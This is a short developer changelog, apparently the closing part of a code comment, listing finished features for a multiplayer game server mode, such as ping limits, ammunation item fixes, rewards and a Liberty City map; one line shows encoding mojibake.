V maxping - ьр щщ·я ўщў суўф ф°р∙хЁф
V spec ping + buttons + /specb
V bot reward
V ammunation + items + sales costs
V ammunation items fix
V hunter level = 15
V trivia 0$
V no messenger/icq
V Liberty City
V rewards: mission/shooting/stunting/achievements
V weekendmoney
V ppt in /heaveavy
V add to /news
*/
